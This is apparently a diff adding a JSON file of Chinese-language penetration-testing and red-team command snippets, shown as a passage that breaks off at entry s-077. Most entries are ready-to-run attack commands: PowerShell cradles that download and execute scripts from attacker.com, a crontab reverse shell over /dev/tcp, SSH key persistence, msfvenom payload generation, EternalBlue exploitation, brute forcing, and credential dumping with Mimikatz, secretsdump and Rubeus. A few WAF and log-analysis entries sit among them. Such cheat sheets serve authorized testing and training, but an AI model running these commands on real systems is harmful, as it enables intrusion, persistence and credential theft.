@@ -1,0 +1,1523 @@
+[
+  {
+    "id": "snippet-001",
+    "title": "Nmap 全端口快速扫描",
+    "tool": "Nmap",
+    "category": "信息收集",
+    "command": "nmap -sS -sV -Pn -p- --min-rate 10000 -T4 -oA scan_full 192.168.1.0/24",
+    "description": "SYN 半开扫描 + 服务版本识别，禁用主机发现，全端口，最小速率 10000 包/秒。",
+    "tags": ["端口扫描", "信息收集"]
+  },
+  {
+    "id": "snippet-002",
+    "title": "Nmap 常见高危脚本扫描",
+    "tool": "Nmap",
+    "category": "漏洞扫描",
+    "command": "nmap -sV --script=vuln,exploit,auth,brute -p21,22,80,443,3306,3389,8080 10.0.0.1",
+    "description": "使用 vuln/exploit/auth/brute 脚本针对常见端口进行快速风险探测。",
+    "tags": ["漏洞扫描", "NSE"]
+  },
+  {
+    "id": "snippet-003",
+    "title": "Dirb 目录爆破（常用字典）",
+    "tool": "dirb / gobuster",
+    "category": "目录扫描",
+    "command": "gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,zip -t 50",
+    "description": "用 Gobuster 对目标进行目录与文件爆破，指定多后缀。",
+    "tags": ["目录扫描", "Web"]
+  },
+  {
+    "id": "snippet-004",
+    "title": "SQLMap 基础使用（GET 参数注入）",
+    "tool": "sqlmap",
+    "category": "漏洞利用",
+    "command": "python3 sqlmap.py -u \"http://target.com/page?id=1\" --batch --dbs --risk 3 --level 5",
+    "description": "对 GET 参数 id 进行自动注入，自动回答 yes，最高风险与测试级别。",
+    "tags": ["SQL", "自动化"]
+  },
+  {
+    "id": "snippet-005",
+    "title": "SQLMap post 请求 + Cookie",
+    "tool": "sqlmap",
+    "category": "漏洞利用",
+    "command": "python3 sqlmap.py -u http://target.com/login --data \"user=admin&pass=test\" --cookie \"PHPSESSID=abc\" --batch --dbs",
+    "description": "带 post body 和 cookie 的注入场景。",
+    "tags": ["SQL", "POST"]
+  },
+  {
+    "id": "snippet-006",
+    "title": "Hydra SSH 弱口令爆破",
+    "tool": "hydra",
+    "category": "漏洞利用",
+    "command": "hydra -L users.txt -P rockyou.txt -t 32 ssh://10.0.0.1",
+    "description": "对目标 SSH 服务进行用户名/字典批量爆破。",
+    "tags": ["爆破", "SSH"]
+  },
+  {
+    "id": "snippet-007",
+    "title": "Hydra Web 表单登录爆破",
+    "tool": "hydra",
+    "category": "漏洞利用",
+    "command": "hydra -l admin -P rockyou.txt target.com http-post-form \"/login:user=^USER^&pass=^PASS^:F=invalid\"",
+    "description": "对 Web 登录表单进行爆破，按关键字判断失败。",
+    "tags": ["爆破", "Web登录"]
+  },
+  {
+    "id": "snippet-008",
+    "title": "MSF Venom 生成 reverse shell",
+    "tool": "msfvenom",
+    "category": "漏洞利用",
+    "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f elf > shell.elf",
+    "description": "生成 Linux x64 Meterpreter Reverse TCP shell 的 ELF 文件。",
+    "tags": ["MSF", "Shell"]
+  },
+  {
+    "id": "snippet-009",
+    "title": "MSF handler 监听",
+    "tool": "Metasploit",
+    "category": "漏洞利用",
+    "command": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j\"",
+    "description": "在后台 (-j) 启动监听 handler。",
+    "tags": ["MSF", "监听"]
+  },
+  {
+    "id": "snippet-010",
+    "title": "Cobalt Strike 上线生成 payload（PowerShell）",
+    "tool": "Cobalt Strike",
+    "category": "权限维持",
+    "command": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://attacker.com/a'))\"",
+    "description": "典型的 PS 下载 cradle 执行远程 payload（仅用于授权的红队演练）。",
+    "tags": ["CobaltStrike", "红队", "上线"]
+  },
+  {
+    "id": "snippet-011",
+    "title": "Impacket 域内用户枚举",
+    "tool": "impacket",
+    "category": "信息收集",
+    "command": "python3 GetADUsers.py domain.local/user:pass -dc-ip 10.0.0.1 -all",
+    "description": "通过 LDAP 列出域内所有用户。",
+    "tags": ["AD", "内网", "枚举"]
+  },
+  {
+    "id": "snippet-012",
+    "title": "Impacket secretsdump 导出凭据",
+    "tool": "impacket",
+    "category": "权限维持",
+    "command": "python3 secretsdump.py domain/admin:'pass'@10.0.0.1 -just-dc-ntlm",
+    "description": "在 DC 上导出所有 NTLM 哈希（需要域管权限，仅用于授权测试）。",
+    "tags": ["AD", "凭据导出"]
+  },
+  {
+    "id": "snippet-013",
+    "title": "BloodHound 采集器（SharpHound.ps1）",
+    "tool": "BloodHound",
+    "category": "信息收集",
+    "command": "powershell -ep bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://x/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\\\tmp\"",
+    "description": "采集 AD 结构用于 BloodHound 可视化分析。",
+    "tags": ["AD", "BloodHound"]
+  },
+  {
+    "id": "snippet-014",
+    "title": "Linux 快速信息收集脚本",
+    "tool": "Bash",
+    "category": "应急响应",
+    "command": "echo '---USER---'; whoami; id; echo '---OS---'; cat /etc/os-release; echo '---NETWORK---'; ip a; echo '---PROCESS---'; ps auxf | head -30; echo '---SUID---'; find / -perm -u+s -type f 2>/dev/null",
+    "description": "获取 Linux 主机的基础信息：用户、系统、网络、进程、SUID 文件。",
+    "tags": ["Linux", "信息收集"]
+  },
+  {
+    "id": "snippet-015",
+    "title": "Windows 基础信息收集",
+    "tool": "cmd",
+    "category": "应急响应",
+    "command": "whoami /priv & hostname & systeminfo | findstr /B /C:\"OS\" & net user & net localgroup administrators & netstat -ano",
+    "description": "Windows 主机的常见信息收集命令合集。",
+    "tags": ["Windows", "信息收集"]
+  },
+  {
+    "id": "snippet-016",
+    "title": "tcpdump 抓包分析 HTTP",
+    "tool": "tcpdump",
+    "category": "网络分析",
+    "command": "sudo tcpdump -i any -nn -s0 -A port 80 or port 8080 | grep -E '(GET|POST|Host:|Cookie:)'",
+    "description": "抓包并提取 HTTP 请求行与关键头。",
+    "tags": ["流量", "抓包"]
+  },
+  {
+    "id": "snippet-017",
+    "title": "Ghidra 调试启动（headless 分析）",
+    "tool": "Ghidra",
+    "category": "逆向分析",
+    "command": "./analyzeHeadless /tmp/ghidra_project test -import ./binary -scriptPath ./scripts -postScript FindFunctions.java",
+    "description": "以 headless 模式导入二进制并执行脚本分析。",
+    "tags": ["逆向", "Ghidra"]
+  },
+  {
+    "id": "snippet-018",
+    "title": "pwntools 基础 exploit 模板",
+    "tool": "pwntools",
+    "category": "漏洞利用",
+    "command": "from pwn import *\nelf = ELF('./binary')\np = process('./binary')\noffset = 0x48\npayload = flat({offset: p64(0x401142)})\np.sendline(payload)\np.interactive()",
+    "description": "最简单的 ret2text 利用模板（覆盖返回地址到 gadget）。",
+    "tags": ["Pwn", "Python"]
+  },
+  {
+    "id": "snippet-019",
+    "title": "Burp Suite 抓 HTTPS 配置备忘",
+    "tool": "Burp",
+    "category": "信息收集",
+    "command": "1) Burp -> Proxy -> Options -> Import/export CA certificate 导出并在浏览器信任\n2) 浏览器代理指向 127.0.0.1:8080\n3) Intercept is on / off 控制抓包",
+    "description": "Burp HTTPS 抓包三步配置。",
+    "tags": ["Burp", "Web"]
+  },
+  {
+    "id": "snippet-020",
+    "title": "RsaCtfTool RSA 自动攻击",
+    "tool": "RsaCtfTool",
+    "category": "密码学",
+    "command": "python3 RsaCtfTool.py --createpub -n 1337... -e 65537 --uncipher 0xABCDEF",
+    "description": "CTF 中对弱 RSA 公钥进行自动攻击（多种算法尝试）。",
+    "tags": ["Crypto", "RSA"]
+  },
+  {
+    "id": "snippet-021",
+    "title": "zsteg / binwalk / foremost 隐写分析三件套",
+    "tool": "zsteg, binwalk, foremost",
+    "category": "逆向分析",
+    "command": "zsteg suspect.png; binwalk -e suspect.png; foremost -i suspect.png -o out/",
+    "description": "对图片/压缩包进行隐写分析，提取隐藏文件。",
+    "tags": ["隐写", "Misc"]
+  },
+  {
+    "id": "snippet-022",
+    "title": "Wireshark 过滤表达式速查",
+    "tool": "Wireshark",
+    "category": "网络分析",
+    "command": "http.request.method==\"POST\" && ip.addr==10.0.0.1 && tcp.port==8080\n# 或按字符串：frame contains \"flag\"\n# 提取对象：File -> Export Objects -> HTTP",
+    "description": "CTF 流量分析常用过滤表达式与导出方式。",
+    "tags": ["流量", "CTF"]
+  },
+  {
+    "id": "snippet-023",
+    "title": "Crontab 后门（持久化）",
+    "tool": "Crontab",
+    "category": "权限维持",
+    "command": "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/10.0.0.10/4444 0>&1\"' >> /etc/crontab",
+    "description": "仅用于授权的红队演练环境：crontab 每分钟回弹 shell。",
+    "tags": ["持久化", "Linux"]
+  },
+  {
+    "id": "snippet-024",
+    "title": "Mimikatz 基础使用",
+    "tool": "Mimikatz",
+    "category": "权限维持",
+    "command": "privilege::debug\nsekurlsa::logonpasswords\nsekurlsa::ekeys\nkerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:ntlm_here",
+    "description": "Mimikatz 典型命令：提升权限、读取凭据、制作 Golden Ticket。仅用于授权环境。",
+    "tags": ["Windows", "凭据"]
+  },
+  {
+    "id": "snippet-025",
+    "title": "SSH 密钥免密持久化",
+    "tool": "SSH",
+    "category": "权限维持",
+    "command": "echo 'ssh-rsa AAAA... attacker@kali' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && sed -i 's/^#*PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config",
+    "description": "将攻击者公钥写入目标 root authorized_keys（授权环境）。",
+    "tags": ["持久化", "SSH"]
+  },
+  {
+    "id": "snippet-026",
+    "title": "AWD 防御：WAF 简单规则（Nginx）",
+    "tool": "Nginx",
+    "category": "应急响应",
+    "command": "if ($query_string ~* '(union.*select|information_schema|benchmark|sleep\\()') { return 403; }\nif ($request_body ~* '(<script|onerror=|javascript:)') { return 403; }",
+    "description": "AWD 比赛时在 Nginx 上添加简单关键字拦截 WAF。",
+    "tags": ["AWD", "防御"]
+  },
+  {
+    "id": "snippet-027",
+    "title": "AWD 批量提交 flag 脚本",
+    "tool": "Python requests",
+    "category": "漏洞利用",
+    "command": "import requests, glob\nfor f in glob.glob('flags/*.txt'):\n    with open(f) as fp:\n        for line in fp:\n            r = requests.post('http://10.0.0.1/submit', json={'flag': line.strip()})\n            print(line.strip(), r.status_code, r.text[:80])",
+    "description": "AWD 比赛批量提交 flag 的 Python 模板。",
+    "tags": ["AWD", "脚本"]
+  },
+  {
+    "id": "snippet-028",
+    "title": "Nuclei 快速批量扫描",
+    "tool": "Nuclei",
+    "category": "漏洞扫描",
+    "command": "nuclei -l targets.txt -t ~/nuclei-templates/cves/ -s critical,high -o nuclei_out.txt -stats",
+    "description": "使用 Nuclei 对 target 列表应用 CVE 模板，输出高危/critical 结果。",
+    "tags": ["Nuclei", "批量"]
+  },
+  {
+    "id": "snippet-029",
+    "title": "ffuf 子域名/目录 fuzz",
+    "tool": "ffuf",
+    "category": "信息收集",
+    "command": "ffuf -w subdomains.txt:FUZZ -u https://FUZZ.target.com -mc 200,301,302 -t 64",
+    "description": "ffuf 子域名 fuzz；将 FUZZ 替换到 URL 中，匹配响应码。",
+    "tags": ["fuzz", "子域名"]
+  },
+  {
+    "id": "snippet-030",
+    "title": "jq 处理 JSON 日志",
+    "tool": "jq",
+    "category": "应急响应",
+    "command": "cat app.log | jq -r '. | select(.status==403 or .status==401) | \"\\(.time) \\(.uri) \\(.src_ip)\"' | head -50",
+    "description": "用 jq 快速筛选 JSON 日志中的 401/403 攻击流量。",
+    "tags": ["日志", "分析"]
+  },
+  {
+    "id": "s-031",
+    "title": "Nmap UDP 端口扫描",
+    "tool": "Nmap",
+    "category": "信息收集",
+    "command": "nmap -sU -Pn -p 53,69,123,161,500,4500 --open --min-rate 5000 10.0.0.1",
+    "description": "针对常见 UDP 服务（DNS/TFTP/NTP/SNMP/IPsec）进行端口扫描，只输出开放端口。",
+    "tags": ["UDP", "Nmap"]
+  },
+  {
+    "id": "s-032",
+    "title": "Nmap 防火墙绕过（分片 + 诱骗 IP）",
+    "tool": "Nmap",
+    "category": "信息收集",
+    "command": "nmap -sS -f -D 10.0.0.2,10.0.0.3,ME -Pn -p 80,443 10.0.0.1",
+    "description": "使用 IP 分片与诱饵源 IP 以绕过简单的 IDS/防火墙。",
+    "tags": ["IDS绕过", "分片"]
+  },
+  {
+    "id": "s-033",
+    "title": "Nmap smb-os-discovery 脚本",
+    "tool": "Nmap",
+    "category": "信息收集",
+    "command": "nmap -sV -p 139,445 --script smb-os-discovery,smb-security-mode 192.168.1.0/24",
+    "description": "探测 Windows SMB 主机的 OS 版本与 SMB 安全配置。",
+    "tags": ["SMB", "枚举"]
+  },
+  {
+    "id": "s-034",
+    "title": "Nmap 指定源端口扫描（绕过出站过滤）",
+    "tool": "Nmap",
+    "category": "信息收集",
+    "command": "nmap -sS -Pn -p 22,80,443,3306 --source-port 53 -oN nmap_sp53.log 10.0.0.1",
+    "description": "使用 DNS 端口（53）作为源端口以绕过部分出站规则。",
+    "tags": ["源端口", "绕过"]
+  },
+  {
+    "id": "s-035",
+    "title": "Nmap NSE http-enum 目录枚举",
+    "tool": "Nmap",
+    "category": "信息收集",
+    "command": "nmap --script http-enum,http-headers,http-methods -p 80,443,8080 target.com",
+    "description": "通过 NSE 脚本枚举 Web 服务常见路径与 HTTP 配置。",
+    "tags": ["NSE", "Web枚举"]
+  },
+  {
+    "id": "s-036",
+    "title": "Masscan 全网段大范围端口扫描",
+    "tool": "Masscan",
+    "category": "信息收集",
+    "command": "sudo masscan 10.0.0.0/16 -p22,80,443,3389,6379 --rate 100000 -oL masscan.log",
+    "description": "高速 C 段扫描，10 万 pps 速率，输出到 grepable 日志。",
+    "tags": ["高速扫描", "B段扫描"]
+  },
+  {
+    "id": "s-037",
+    "title": "Masscan 全端口扫描 + banner 抓取",
+    "tool": "Masscan",
+    "category": "信息收集",
+    "command": "sudo masscan 192.168.0.0/24 -p1-65535 --banners --rate 50000 -oB masscan.bin",
+    "description": "对目标进行全端口扫描并抓取 banner，以二进制格式保存。",
+    "tags": ["全端口", "banner"]
+  },
+  {
+    "id": "s-038",
+    "title": "Zmap 全网快速扫描（ICMP Echo）",
+    "tool": "Zmap",
+    "category": "信息收集",
+    "command": "sudo zmap -p 80 -o zmap_out.log 10.0.0.0/8",
+    "description": "大规模扫描指定网段，输出监听 80 端口的主机列表。",
+    "tags": ["Zmap", "大规模扫描"]
+  },
+  {
+    "id": "s-039",
+    "title": "Gobuster 目录扫描（多种响应码过滤）",
+    "tool": "Gobuster",
+    "category": "目录扫描",
+    "command": "gobuster dir -u https://target.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,aspx,jsp,html -e -k -b 403,404 -t 100",
+    "description": "对目标进行目录/文件枚举，过滤 403/404，使用大字典 + 多线程。",
+    "tags": ["Gobuster", "Web目录"]
+  },
+  {
+    "id": "s-040",
+    "title": "Dirsearch 递归目录扫描",
+    "tool": "Dirsearch",
+    "category": "目录扫描",
+    "command": "python3 dirsearch.py -u https://target.com -w web-common.txt -r -R 2 -e php,html,json,bak -t 50 --exclude-sizes 0B,123B -o dirsearch.json",
+    "description": "递归 2 层扫描目标，排除指定响应大小，输出 JSON 结果。",
+    "tags": ["Dirsearch", "递归"]
+  },
+  {
+    "id": "s-041",
+    "title": "Feroxbuster 带代理与递归目录扫描",
+    "tool": "Feroxbuster",
+    "category": "目录扫描",
+    "command": "feroxbuster -u http://target.com -w wordlist.txt -x php,html -r -d 3 --proxy http://127.0.0.1:8080 -C 404 --rate-limit 100",
+    "description": "使用 Feroxbuster 做深度 3 的递归扫描，通过 Burp 代理发请求。",
+    "tags": ["Feroxbuster", "递归"]
+  },
+  {
+    "id": "s-042",
+    "title": "BurpSuite Active Scanner 主动扫描",
+    "tool": "BurpSuite",
+    "category": "Web扫描",
+    "command": "Burp -> Dashboard -> New live task -> Add URLs -> Scan type: Active scan -> 选择扫描强度 -> Start",
+    "description": "Burp Suite 主动扫描模式（UI 操作），对目标进行 SQLi/XSS/SSRF 等检查。",
+    "tags": ["Burp", "主动扫描"]
+  },
+  {
+    "id": "s-043",
+    "title": "BurpSuite Repeater 请求重放",
+    "tool": "BurpSuite",
+    "category": "Web扫描",
+    "command": "Burp Proxy -> 拦截到请求 -> 右键 Send to Repeater -> 点击 Send 重放并观察响应",
+    "description": "使用 Repeater 手动调整请求并分析响应差异。",
+    "tags": ["Burp", "Repeater"]
+  },
+  {
+    "id": "s-044",
+    "title": "Burp Intruder pitchfork 爆破验证码",
+    "tool": "BurpSuite",
+    "category": "漏洞利用",
+    "command": "Burp Intruder -> Attack type: pitchfork -> 添加 $token$,$pw$ -> payload1=tokenlist, payload2=passlist -> Start attack",
+    "description": "使用 Intruder 的 pitchfork 模式双列字典逐一尝试。",
+    "tags": ["Burp", "Intruder", "爆破"]
+  },
+  {
+    "id": "s-045",
+    "title": "BurpSuite Passive Scan 被动扫描配置",
+    "tool": "BurpSuite",
+    "category": "Web扫描",
+    "command": "Dashboard -> Live passive scan -> 设置扫描范围 (scope) -> 自动分析浏览流量",
+    "description": "被动扫描模式只分析不发请求，适合流量巡检。",
+    "tags": ["Burp", "被动扫描"]
+  },
+  {
+    "id": "s-046",
+    "title": "sqlmap 使用 tamper 脚本绕过 WAF",
+    "tool": "sqlmap",
+    "category": "漏洞利用",
+    "command": "python3 sqlmap.py -u \"http://target.com/page?id=1\" --tamper=space2comment,charencode --level=3 --risk=2 --batch",
+    "description": "使用多个 tamper 脚本混淆 payload 绕过 WAF，level3 增加检查路径。",
+    "tags": ["sqlmap", "WAF绕过"]
+  },
+  {
+    "id": "s-047",
+    "title": "sqlmap POST JSON 参数注入",
+    "tool": "sqlmap",
+    "category": "漏洞利用",
+    "command": "python3 sqlmap.py -u http://target.com/api --headers \"Content-Type: application/json\" --data '{\"user\":\"admin\",\"pass\":\"test\"}' -p pass --batch --dbs",
+    "description": "针对 Content-Type=application/json 的 POST 请求进行注入。",
+    "tags": ["sqlmap", "JSON", "POST"]
+  },
+  {
+    "id": "s-048",
+    "title": "sqlmap Cookie/UA 注入测试",
+    "tool": "sqlmap",
+    "category": "漏洞利用",
+    "command": "python3 sqlmap.py -u http://target.com/ --cookie \"id=1;uid=2\" -p id --user-agent=\"sqlmap/1.0\" --level=5 --risk=3 --batch",
+    "description": "测试 HTTP Cookie 和 User-Agent 头是否存在注入点。",
+    "tags": ["sqlmap", "Cookie", "Header"]
+  },
+  {
+    "id": "s-049",
+    "title": "sqlmap 指定 DBMS 加速 + os-shell",
+    "tool": "sqlmap",
+    "category": "漏洞利用",
+    "command": "python3 sqlmap.py -u \"http://target.com/index?id=1\" --dbms=MySQL --batch --os-shell",
+    "description": "明确数据库类型并尝试交互 shell（MySQL 需要 FILE 权限）。",
+    "tags": ["sqlmap", "os-shell"]
+  },
+  {
+    "id": "s-050",
+    "title": "sqlmap 读取 request 文件做完整请求",
+    "tool": "sqlmap",
+    "category": "漏洞利用",
+    "command": "python3 sqlmap.py -r request.txt -p username --batch --dbs --threads=10",
+    "description": "从文件读取完整 HTTP 请求，针对指定参数进行注入。",
+    "tags": ["sqlmap", "-r"]
+  },
+  {
+    "id": "s-051",
+    "title": "Hydra FTP 弱口令爆破",
+    "tool": "hydra",
+    "category": "漏洞利用",
+    "command": "hydra -L users.txt -P pass.txt -t 16 -vV ftp://10.0.0.1",
+    "description": "对 FTP 服务进行用户名/密码字典爆破，显示每次尝试。",
+    "tags": ["Hydra", "FTP"]
+  },
+  {
+    "id": "s-052",
+    "title": "medusa RDP 暴力破解",
+    "tool": "medusa",
+    "category": "漏洞利用",
+    "command": "medusa -h 10.0.0.1 -u admin -P pass.txt -M rdp -m GROUP:RDP",
+    "description": "使用 medusa 对 Windows RDP（3389）服务进行批量登录尝试。",
+    "tags": ["medusa", "RDP"]
+  },
+  {
+    "id": "s-053",
+    "title": "patator HTTP 表单登录爆破（灵活控制）",
+    "tool": "patator",
+    "category": "漏洞利用",
+    "command": "patator http_fuzz url=http://target.com/login method=POST body=\"user=FILE0&pass=FILE1\" 0=users.txt 1=pass.txt -x ignore:code=200 -x ignore:fgrep='invalid'",
+    "description": "使用 patator 对 Web 表单进行更灵活的爆破（按响应码/关键字过滤）。",
+    "tags": ["patator", "Web登录"]
+  },
+  {
+    "id": "s-054",
+    "title": "hydra SMB 共享弱口令枚举",
+    "tool": "hydra",
+    "category": "漏洞利用",
+    "command": "hydra -L users.txt -P pass.txt 10.0.0.1 smb -V",
+    "description": "对目标的 SMB 协议进行批量凭据尝试（配合内网场景）。",
+    "tags": ["hydra", "SMB"]
+  },
+  {
+    "id": "s-055",
+    "title": "msfconsole 搜索并使用 exploit 模块",
+    "tool": "msfconsole",
+    "category": "漏洞利用",
+    "command": "msfconsole -q -x \"search ms17_010; use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.1; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.10; exploit\"",
+    "description": "搜索 MS17-010 模块并配置参数后直接发起攻击。",
+    "tags": ["MSF", "MS17-010"]
+  },
+  {
+    "id": "s-056",
+    "title": "msfvenom 生成 Windows DLL payload",
+    "tool": "msfvenom",
+    "category": "漏洞利用",
+    "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=9999 -f dll -o evil.dll",
+    "description": "生成反向 TCP meterpreter DLL 用于 DLL hijack / regsvr32 执行。",
+    "tags": ["MSF", "DLL"]
+  },
+  {
+    "id": "s-057",
+    "title": "msfvenom 生成 Java JSP WebShell",
+    "tool": "msfvenom",
+    "category": "漏洞利用",
+    "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.10 LPORT=443 -f raw > shell.jsp",
+    "description": "生成 JSP 反弹 shell 文件，上传后访问即可回弹。",
+    "tags": ["MSF", "JSP", "Webshell"]
+  },
+  {
+    "id": "s-058",
+    "title": "msfconsole post 模块获取系统信息",
+    "tool": "msfconsole",
+    "category": "权限维持",
+    "command": "msfconsole -q -x \"use post/windows/gather/wmic_command; set SESSION 1; set COMMANDS \"\"\"process list,useraccount list,group list,logonaccount list\"\"\"; run\"",
+    "description": "在拿到的 Meterpreter session 中使用 post 模块收集目标信息。",
+    "tags": ["MSF", "post", "信息收集"]
+  },
+  {
+    "id": "s-059",
+    "title": "CrackMapExec SMB 凭据喷洒",
+    "tool": "CrackMapExec",
+    "category": "漏洞利用",
+    "command": "crackmapexec smb 192.168.1.0/24 -u users.txt -p pass.txt --continue-on-success",
+    "description": "对整个 C 段 SMB 服务进行用户名/密码喷洒，找到可用凭据。",
+    "tags": ["CME", "SMB", "喷洒"]
+  },
+  {
+    "id": "s-060",
+    "title": "CrackMapExec WinRM 执行命令",
+    "tool": "CrackMapExec",
+    "category": "漏洞利用",
+    "command": "crackmapexec winrm 192.168.1.10 -u admin -p 'P@ssw0rd' -x 'whoami && ipconfig'",
+    "description": "通过 WinRM 在目标上执行命令并查看输出。",
+    "tags": ["CME", "WinRM"]
+  },
+  {
+    "id": "s-061",
+    "title": "CrackMapExec 获取 SAM/NTDS 哈希",
+    "tool": "CrackMapExec",
+    "category": "权限维持",
+    "command": "crackmapexec smb 10.0.0.1 -u admin -H 'NTLM_HERE' --sam\ncrackmapexec smb 10.0.0.1 -u admin -p 'pass' --ntds",
+    "description": "通过 SMB 对目标机器导出 SAM/NT.DIT 哈希（需要管理员权限）。",
+    "tags": ["CME", "凭据导出"]
+  },
+  {
+    "id": "s-062",
+    "title": "Impacket psexec 半交互式 shell",
+    "tool": "Impacket",
+    "category": "漏洞利用",
+    "command": "python3 psexec.py 'domain/admin:pass@10.0.0.1' 'cmd.exe'",
+    "description": "使用 psexec.py 通过 SMB 连接获取交互式系统 shell。",
+    "tags": ["Impacket", "psexec"]
+  },
+  {
+    "id": "s-063",
+    "title": "Impacket wmiexec 命令执行",
+    "tool": "Impacket",
+    "category": "漏洞利用",
+    "command": "python3 wmiexec.py 'domain/user:pass@10.0.0.1' 'whoami & hostname'",
+    "description": "通过 WMI 服务在目标上执行命令（需要 WMI DCOM 135/445 端口开放）。",
+    "tags": ["Impacket", "WMI"]
+  },
+  {
+    "id": "s-064",
+    "title": "Evil-WinRM 远程管理 shell",
+    "tool": "Evil-WinRM",
+    "category": "漏洞利用",
+    "command": "evil-winrm -i 10.0.0.1 -u admin -H 'AAD3B435B51404EEAAD3B435B51404EE:NTLM_HASH_HERE' -s ./psscripts/",
+    "description": "通过 WinRM + NTLM Hash 获取 shell，并加载本地 PowerShell 脚本目录。",
+    "tags": ["WinRM", "Pass-the-Hash"]
+  },
+  {
+    "id": "s-065",
+    "title": "Nishang Invoke-PowerShellTcp 反弹 shell",
+    "tool": "Nishang",
+    "category": "漏洞利用",
+    "command": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Shells/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.10 -Port 4444\"",
+    "description": "从 HTTP 加载 Nishang Tcp 反弹脚本（需要攻击者在 4444 端口监听）。",
+    "tags": ["PowerShell", "Nishang", "反弹"]
+  },
+  {
+    "id": "s-066",
+    "title": "PowerSploit Invoke-Mimikatz 远程加载",
+    "tool": "PowerSploit",
+    "category": "权限维持",
+    "command": "powershell -nop -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
+    "description": "远程下载并执行 Invoke-Mimikatz 转储内存凭据。",
+    "tags": ["PowerShell", "Mimikatz"]
+  },
+  {
+    "id": "s-067",
+    "title": "Nishang Get-Information Windows 信息收集",
+    "tool": "Nishang",
+    "category": "信息收集",
+    "command": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Nishang/Gather/Get-Information.ps1'); Get-Information | Out-File info.txt\"",
+    "description": "一键收集 Windows 系统信息：用户、权限、网络、AV、补丁等。",
+    "tags": ["PowerShell", "信息收集"]
+  },
+  {
+    "id": "s-068",
+    "title": "Mimikatz sekurlsa 提取登录凭据",
+    "tool": "Mimikatz",
+    "category": "权限维持",
+    "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"sekurlsa::ekeys\" \"exit\"",
+    "description": "在具有 debug 权限的 LSASS 进程中提取明文密码、NTLM、Kerberos 会话密钥。",
+    "tags": ["Mimikatz", "凭据"]
+  },
+  {
+    "id": "s-069",
+    "title": "Mimikatz DCSync 导出域用户 NTLM",
+    "tool": "Mimikatz",
+    "category": "权限维持",
+    "command": "mimikatz.exe \"lsadump::dcsync /domain:domain.local /user:krbtgt\" \"exit\"",
+    "description": "模拟 DC 同步请求导出指定用户（如 krbtgt）的 NTLM 哈希。",
+    "tags": ["Mimikatz", "DCSync"]
+  },
+  {
+    "id": "s-070",
+    "title": "Rubeus AS-REP Roasting",
+    "tool": "Rubeus",
+    "category": "权限维持",
+    "command": "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap",
+    "description": "对域内设置了 \"Do not require Kerberos preauth\" 的用户发起 AS-REP Roasting。",
+    "tags": ["Rubeus", "Kerberos", "Roasting"]
+  },
+  {
+    "id": "s-071",
+    "title": "Rubeus Kerberoast 导出服务票据",
+    "tool": "Rubeus",
+    "category": "权限维持",
+    "command": "Rubeus.exe kerberoast /format:hashcat /outfile:spn_hashes.txt",
+    "description": "对域内带 SPN 的账户进行 Kerberoast 攻击，输出 hashcat 可破解格式。",
+    "tags": ["Rubeus", "Kerberoast"]
+  },
+  {
+    "id": "s-072",
+    "title": "Certipy 枚举 AD CS 证书模板",
+    "tool": "Certipy",
+    "category": "信息收集",
+    "command": "certipy find -u user@domain.local -p 'pass' -dc-ip 10.0.0.1 -vulnerable -text",
+    "description": "枚举 AD CS 证书模板并找出可被滥用的易受攻击模板。",
+    "tags": ["Certipy", "AD CS"]
+  },
+  {
+    "id": "s-073",
+    "title": "Certipy ESC1 证书申请 + 请求 TGT",
+    "tool": "Certipy",
+    "category": "权限维持",
+    "command": "certipy req -u user@domain.local -p 'pass' -dc-ip 10.0.0.1 -template VulnTemplate -ca CA-NAME -upn admin@domain.local\ncertipy auth -pfx admin.pfx -dc-ip 10.0.0.1",
+    "description": "利用弱证书模板 (ESC1) 申请证书，然后用证书 Kerberos 认证获取 TGT。",
+    "tags": ["Certipy", "AD CS", "ESC1"]
+  },
+  {
+    "id": "s-074",
+    "title": "xray 主动扫描 Web 漏洞",
+    "tool": "xray",
+    "category": "Web扫描",
+    "command": "./xray webscan --url https://target.com --html-output xray.html",
+    "description": "xray 单次对目标 URL 做主动扫描并生成 HTML 报告。",
+    "tags": ["xray", "主动扫描"]
+  },
+  {
+    "id": "s-075",
+    "title": "xray 被动爬虫扫描",
+    "tool": "xray",
+    "category": "Web扫描",
+    "command": "./xray webscan --basic-crawler https://target.com --json-output xray.json",
+    "description": "让 xray 自身爬取目标站点后做漏洞检测。",
+    "tags": ["xray", "爬虫"]
+  },
+  {
+    "id": "s-076",
+    "title": "Nuclei 使用 POC 模板精确检测",
+    "tool": "Nuclei",
+    "category": "漏洞扫描",
+    "command": "nuclei -u https://target.com -t ./nuclei-templates/cves/2021/ -s high,critical -rl 50",
+    "description": "仅对目标 URL 应用 CVE-2021 POC 模板，限制速率。",
+    "tags": ["Nuclei", "POC"]
+  },
+  {
+    "id": "s-077",
+    "title": "afrog 漏洞扫描器批量扫描",
+    "tool": "afrog",
+    "category": "漏洞扫描",
